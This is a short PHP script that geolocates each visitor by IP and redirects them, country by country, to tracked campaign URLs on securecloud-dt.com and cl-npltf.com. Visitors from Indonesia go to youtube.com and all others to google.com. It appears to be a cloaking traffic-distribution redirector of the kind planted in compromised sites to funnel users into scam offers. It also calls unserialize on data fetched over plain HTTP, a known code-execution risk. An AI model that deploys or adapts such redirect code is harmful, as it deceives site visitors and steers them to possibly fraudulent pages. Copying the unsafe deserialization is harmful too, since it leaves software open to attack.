<?php
$a = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$countrycode= $a['geoplugin_countryCode'];

if ($countrycode=='AT')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=164115&s1=budipekerti' ) ;
else if ($countrycode=='AU')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=129558&s1=budipekerti' ) ;
else if ($countrycode=='BE')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=101955&s1=budipekerti' ) ;
else if ($countrycode=='CA')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=165170&s1=budipekerti' ) ;
else if ($countrycode=='CH')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=162873&s1=budipekerti' ) ;
else if ($countrycode=='CZ')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=154826&s1=budipekerti' ) ;
else if ($countrycode=='DE')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=179424&s1=budipekerti' ) ; 
else if ($countrycode=='DK')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=150402&s1=budipekerti' ) ; 
else if ($countrycode=='ES')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=123412&s1=budipekerti' ) ; 
else if ($countrycode=='FI')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=152144&s1=budipekerti' ) ; 
else if ($countrycode=='FR')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=166715&s1=budipekerti' ) ; 
else if ($countrycode=='GB')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=167938&s1=budipekerti' ) ; 
else if ($countrycode=='HK')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=141320&s1=budipekerti' ) ; 
else if ($countrycode=='HU')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=169800&s1=budipekerti' ) ; 
else if ($countrycode=='IE')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=116298&s1=budipekerti' ) ; 
else if ($countrycode=='IT')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=175267&s1=budipekerti' ) ; 
else if ($countrycode=='JP')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=152560&s1=budipekerti' ) ; 
else if ($countrycode=='KR')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=117994&s1=budipekerti' ) ; 
else if ($countrycode=='NL')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=168333&s1=budipekerti' ) ; 
else if ($countrycode=='NO')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=154873&s1=budipekerti' ) ; 
else if ($countrycode=='PL')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=116282&s1=budipekerti' ) ; 
else if ($countrycode=='PT')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=164398&s1=budipekerti' ) ; 
else if ($countrycode=='RU')
    header( 'Location: http://cl-npltf.com/?a=64054&c=94892&s1=budipekerti' ) ; 
else if ($countrycode=='SE')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=157889&s1=budipekerti' ) ; 
else if ($countrycode=='SG')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=121873&s1=budipekerti' ) ; 
else if ($countrycode=='TR')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=164633&s1=budipekerti' ) ; 
else if ($countrycode=='TW')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=145855&s1=budipekerti' ) ; 
else if ($countrycode=='NZ')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=167938&s1=budipekerti' ) ; 
else if ($countrycode=='US')
    header( 'Location: http://securecloud-dt.com/?a=64054&c=86521&s1=budipekerti' ) ; 
else if ($countrycode=='TW')
    header( 'Location: https://securecloud-dt.com/?a=64054&c=145855&s1=budipekerti' ) ; 
else if ($countrycode=='ID')
    header( 'Location: http://youtube.com' ) ; 
else
    header( 'Location: http://google.com' ) ;
?>
